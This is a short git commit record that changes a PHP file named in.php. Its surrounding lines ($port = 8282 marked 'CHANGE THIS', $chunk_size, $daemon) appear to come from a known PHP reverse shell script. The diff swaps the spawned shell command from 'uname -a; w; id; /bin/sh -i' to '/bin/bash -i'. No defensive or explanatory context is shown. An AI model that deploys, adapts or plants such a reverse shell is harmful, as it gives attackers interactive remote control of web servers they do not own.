25062525ee782a3b2c0a81e16e3019b7a15415f3
finpri <finpri@proton.me>
2026-08-17 13:09:26 +0300

    Update in.php

--- in.php
+++ in.php
@@ -6,7 +6,7 @@ $port = 8282;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
+$shell = '/bin/bash -i';
 $daemon = 0;
 $debug = 0;
 
